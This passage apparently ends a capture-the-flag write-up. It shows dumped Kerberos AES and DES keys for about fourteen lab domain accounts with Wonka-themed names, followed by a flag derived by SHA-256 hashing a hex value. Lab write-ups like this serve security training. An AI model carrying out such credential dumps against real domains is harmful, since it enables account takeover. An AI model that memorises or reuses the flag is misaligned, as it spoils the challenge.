prince.pondicherry:aes256-cts-hmac-sha1-96:e2f208d728b63162a7ea245700ec5416d77e5c2e38dc9f9c90f866ec638d542d
prince.pondicherry:aes128-cts-hmac-sha1-96:986550cfcc2ed3ad49169c54aa6b225a
prince.pondicherry:des-cbc-md5:45d332bc46aec4dc
grandpa.joe:aes256-cts-hmac-sha1-96:34c7fd66f539f3c052e82ad5e2ac0c4a77d7eaf989e087a215ef81f6fb02babf
grandpa.joe:aes128-cts-hmac-sha1-96:beb491d5934ab7a76782ee7117297d82
grandpa.joe:des-cbc-md5:5ef18932d967ec75
grandma.josephine:aes256-cts-hmac-sha1-96:91e88332adc10d17569678f70c5f3af39617880cd6f65434793c9505b7c307fb
grandma.josephine:aes128-cts-hmac-sha1-96:0ea9faadf92b3319e63a1a48329e8da7
grandma.josephine:des-cbc-md5:fd6b761689e9f40d
mrs.salt:aes256-cts-hmac-sha1-96:e85615357dd3ae4a765ac071b9c865b2d447ba4c01e0ae9f10271e3019c439ee
mrs.salt:aes128-cts-hmac-sha1-96:e9a6e52177fabc6270a56f20cf2a176f
mrs.salt:des-cbc-md5:32194f102f406238
slugworth:aes256-cts-hmac-sha1-96:fc46b0d87731d07dae92e4ab26e1601ae0b99d52e8cef32459eac7a7e1db5c75
slugworth:aes128-cts-hmac-sha1-96:a969e4f691f2990ebb58b5be25ea9104
slugworth:des-cbc-md5:df2662e00dc8cea8
mrs.gloop:aes256-cts-hmac-sha1-96:44746442893828abecf14c4732d2b0bc3dc38c51c24b1c37d108e564d71aab70
mrs.gloop:aes128-cts-hmac-sha1-96:fcada18a96087653b6e4e4a4391f560a
mrs.gloop:des-cbc-md5:c17ae36bcb523d8f
grandpa.george:aes256-cts-hmac-sha1-96:36a02685211adb9a6104286990e3bbf3d3db7c767fd1d91b5a2652ca810f2c9a
grandpa.george:aes128-cts-hmac-sha1-96:b10876b2c596bea9a6e94fce37b78acc
grandpa.george:des-cbc-md5:ea9170e51afe7949
luminous.lolly:aes256-cts-hmac-sha1-96:a51422d513f23afb03ca1ba6df58a11715b93b7ae6c111a4b845311544e7b824
luminous.lolly:aes128-cts-hmac-sha1-96:1b4716c454fdc4e830765fb3c80de068
luminous.lolly:des-cbc-md5:e02686b34a1ccb37
wilbur.wonka:aes256-cts-hmac-sha1-96:4a021b6ac40ce1a8796fd4427c43c8b9396a25da82d1f443ce8efb587536c15f
wilbur.wonka:aes128-cts-hmac-sha1-96:b7a53c20659424845ef408e5ad804198
wilbur.wonka:des-cbc-md5:434a3b92d0bce9d6
pedro.lecochon:aes256-cts-hmac-sha1-96:1504f21616b5508bb7e8b9620da79d72721f8fbc1beee011dac1f0a6ee3f2222
pedro.lecochon:aes128-cts-hmac-sha1-96:eefd70eafd4f8fafe4202e3c95ecc44d
pedro.lecochon:des-cbc-md5:2338e008674cd0ef
pedro.lalicorne:aes256-cts-hmac-sha1-96:1c1f16105a0181ef0467db61dc229ee30a20d3985e212b72045c20a7eb7d6393
pedro.lalicorne:aes128-cts-hmac-sha1-96:9c9d43e945d6e748bb8c6b88d98d8a55
pedro.lalicorne:des-cbc-md5:4f80cb644f7c1c4c
aas:aes256-cts-hmac-sha1-96:a5531670575ba000da487cd8de02c6c62576e12147a939d1978a4f76ce4ba856
aas:aes128-cts-hmac-sha1-96:84266088d51a994e790e7b3d833adbb9
aas:des-cbc-md5:c70e9443917043d9
lyderic.lefebvre:aes256-cts-hmac-sha1-96:2d620cd2671120fc3ca0af1745772e8cbd06d41dddd93b970492b13991d19007
lyderic.lefebvre:aes128-cts-hmac-sha1-96:493313529fddc68f5affdcfb301cd888
lyderic.lefebvre:des-cbc-md5:383440b9526446a7
[*] Cleaning up...
```

## Flag

```bsh
echo -n '3c68c509b487662c87ced8ebcda6e69b' |sha256sum
24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5  -
```

> 24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5